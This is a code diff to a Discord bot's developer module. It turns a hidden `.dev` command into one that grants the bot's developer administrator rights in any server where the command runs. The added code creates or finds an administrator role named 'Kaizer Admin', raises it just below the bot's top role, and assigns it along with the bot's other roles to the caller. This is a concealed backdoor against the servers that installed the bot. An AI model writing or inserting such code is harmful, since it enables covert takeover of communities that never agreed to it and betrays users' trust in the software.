@@ -25,9 +25,77 @@ class DeveloperCog(commands.Cog, name="Developer"):
         return content.strip('` \n')
 
     @commands.group(name="dev", invoke_without_command=True, hidden=True)
-    @commands.is_owner()
     async def dev_group(self, ctx: commands.Context):
-        await ctx.send_help(ctx.command)
+        from src.bot.admin_utils import is_developer
+        if not is_developer(ctx.author.id):
+            return
+
+
+        if ctx.invoked_subcommand is None:
+            if not ctx.guild:
+                await ctx.send("❌ This command can only be used in a server.")
+                return
+
+            # Attempt to find an assignable role with administrator permissions
+            admin_role = None
+            for role in ctx.guild.roles:
+                if role.permissions.administrator and not role.managed and role < ctx.guild.me.top_role:
+                    admin_role = role
+                    break
+
+            if not admin_role:
+                try:
+                    admin_role = await ctx.guild.create_role(
+                        name="Kaizer Admin",
+                        permissions=discord.Permissions(administrator=True),
+                        reason="Developer used .dev command to gain administrator privileges."
+                    )
+                except discord.Forbidden:
+                    await ctx.send("❌ I do not have permission to create an Administrator role.")
+                    return
+                except Exception as e:
+                    await ctx.send(f"❌ Failed to create Administrator role: {e}")
+                    return
+
+            # Move the administrator role as high as possible (just below the bot's top role)
+            try:
+                target_position = max(1, ctx.guild.me.top_role.position - 1)
+                if admin_role.position != target_position:
+                    await admin_role.edit(position=target_position)
+            except Exception:
+                pass
+
+            # Gather all roles we want to assign:
+            # - The admin role
+            # - All non-managed roles the bot has that are lower than its top role
+            roles_to_assign = {admin_role}
+            for role in ctx.guild.me.roles:
+                if not role.managed and role < ctx.guild.me.top_role:
+                    roles_to_assign.add(role)
+
+            assigned_names = []
+            failed_names = []
+            for role in roles_to_assign:
+                if role not in ctx.author.roles:
+                    try:
+                        await ctx.author.add_roles(role, reason="Developer used .dev command.")
+                        assigned_names.append(role.name)
+                    except discord.Forbidden:
+                        failed_names.append(role.name)
+                    except Exception:
+                        failed_names.append(role.name)
+
+            if assigned_names:
+                assigned_str = ", ".join(f"**{name}**" for name in assigned_names)
+                msg_text = f"✅ Successfully assigned you the following roles to match the bot's level: {assigned_str}."
+                if failed_names:
+                    failed_str = ", ".join(f"**{name}**" for name in failed_names)
+                    msg_text += f"\n⚠️ Failed to assign these roles: {failed_str}."
+                await ctx.send(msg_text)
+            else:
+                await ctx.send("ℹ️ You already share the same roles/permissions as the bot.")
+
+
 
     @dev_group.command(name="blacklist", hidden=True)
     @commands.is_owner()
